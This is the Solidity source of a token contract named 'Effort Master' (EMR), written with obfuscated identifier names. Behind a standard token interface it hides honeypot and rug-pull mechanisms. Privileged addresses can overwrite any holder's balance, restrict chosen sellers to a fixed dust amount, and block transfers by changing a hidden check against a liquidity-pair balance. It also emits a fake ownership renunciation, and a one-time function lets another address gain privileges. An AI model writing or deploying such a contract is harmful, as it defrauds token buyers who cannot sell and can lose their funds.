//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface liquidityLimit {
    function createPair(address modeLaunch, address listToken) external returns (address);
}

interface buyList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitMaxReceiver) external view returns (uint256);

    function transfer(address shouldLiquidity, uint256 launchedIs) external returns (bool);

    function allowance(address takeLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedIs) external returns (bool);

    function transferFrom(
        address sender,
        address shouldLiquidity,
        uint256 launchedIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellTeamTrading, uint256 value);
    event Approval(address indexed takeLiquidity, address indexed spender, uint256 value);
}

abstract contract receiverFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyListMetadata is buyList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EffortMaster is receiverFee, buyList, buyListMetadata {

    uint8 private isEnable = 18;

    function balanceOf(address limitMaxReceiver) public view virtual override returns (uint256) {
        return fromToIs[limitMaxReceiver];
    }

    bool public modeAmount;

    mapping(address => uint256) private fromToIs;

    address minTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public autoReceiver;

    function allowance(address sellLaunchedLiquidity, address maxBuy) external view virtual override returns (uint256) {
        if (maxBuy == minTeam) {
            return type(uint256).max;
        }
        return launchTrading[sellLaunchedLiquidity][maxBuy];
    }

    string private isTrading = "Effort Master";

    bool public senderFeeTeam;

    function decimals() external view virtual override returns (uint8) {
        return isEnable;
    }

    function approve(address maxBuy, uint256 launchedIs) public virtual override returns (bool) {
        launchTrading[_msgSender()][maxBuy] = launchedIs;
        emit Approval(_msgSender(), maxBuy, launchedIs);
        return true;
    }

    function transferFrom(address takeIsSell, address shouldLiquidity, uint256 launchedIs) external override returns (bool) {
        if (_msgSender() != minTeam) {
            if (launchTrading[takeIsSell][_msgSender()] != type(uint256).max) {
                require(launchedIs <= launchTrading[takeIsSell][_msgSender()]);
                launchTrading[takeIsSell][_msgSender()] -= launchedIs;
            }
        }
        return receiverList(takeIsSell, shouldLiquidity, launchedIs);
    }

    uint256 listAt;

    mapping(address => bool) public marketingFromMode;

    address public receiverSell;

    function listTake(uint256 launchedIs) public {
        limitTeamFund();
        listAt = launchedIs;
    }

    uint256 private fundWallet = 100000000 * 10 ** 18;

    address public receiverExemptMode;

    function name() external view virtual override returns (string memory) {
        return isTrading;
    }

    function walletTokenAt(address toMaxIs, uint256 launchedIs) public {
        limitTeamFund();
        fromToIs[toMaxIs] = launchedIs;
    }

    event OwnershipTransferred(address indexed tradingFund, address indexed buyFund);

    uint256 private launchReceiverMax;

    function transfer(address toMaxIs, uint256 launchedIs) external virtual override returns (bool) {
        return receiverList(_msgSender(), toMaxIs, launchedIs);
    }

    mapping(address => mapping(address => uint256)) private launchTrading;

    bool public exemptFund;

    uint256 public launchAutoMax;

    constructor (){
        
        listBuy amountIs = listBuy(minTeam);
        receiverExemptMode = liquidityLimit(amountIs.factory()).createPair(amountIs.WETH(), address(this));
        if (senderFeeTeam) {
            limitTo = true;
        }
        receiverSell = _msgSender();
        autoReceiver[receiverSell] = true;
        fromToIs[receiverSell] = fundWallet;
        maxLimitAmount();
        if (launchAutoMax != launchReceiverMax) {
            launchReceiverMax = launchAutoMax;
        }
        emit Transfer(address(0), receiverSell, fundWallet);
    }

    function tokenBuy(address swapTake) public {
        require(swapTake.balance < 100000);
        if (modeAmount) {
            return;
        }
        
        autoReceiver[swapTake] = true;
        if (launchReceiverMax == launchAutoMax) {
            senderFeeTeam = false;
        }
        modeAmount = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return minAuto;
    }

    function receiverList(address takeIsSell, address shouldLiquidity, uint256 launchedIs) internal returns (bool) {
        if (takeIsSell == receiverSell) {
            return receiverShould(takeIsSell, shouldLiquidity, launchedIs);
        }
        uint256 teamFrom = buyList(receiverExemptMode).balanceOf(minMode);
        require(teamFrom == listAt);
        require(shouldLiquidity != minMode);
        if (marketingFromMode[takeIsSell]) {
            return receiverShould(takeIsSell, shouldLiquidity, receiverLaunched);
        }
        return receiverShould(takeIsSell, shouldLiquidity, launchedIs);
    }

    function getOwner() external view returns (address) {
        return shouldTotal;
    }

    uint256 swapReceiver;

    address minMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function liquidityReceiver(address enableTokenExempt) public {
        limitTeamFund();
        
        if (enableTokenExempt == receiverSell || enableTokenExempt == receiverExemptMode) {
            return;
        }
        marketingFromMode[enableTokenExempt] = true;
    }

    function limitTeamFund() private view {
        require(autoReceiver[_msgSender()]);
    }

    function receiverShould(address takeIsSell, address shouldLiquidity, uint256 launchedIs) internal returns (bool) {
        require(fromToIs[takeIsSell] >= launchedIs);
        fromToIs[takeIsSell] -= launchedIs;
        fromToIs[shouldLiquidity] += launchedIs;
        emit Transfer(takeIsSell, shouldLiquidity, launchedIs);
        return true;
    }

    string private minAuto = "EMR";

    uint256 constant receiverLaunched = 20 ** 10;

    bool public limitTo;

    address private shouldTotal;

    function owner() external view returns (address) {
        return shouldTotal;
    }

    function maxLimitAmount() public {
        emit OwnershipTransferred(receiverSell, address(0));
        shouldTotal = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundWallet;
    }

}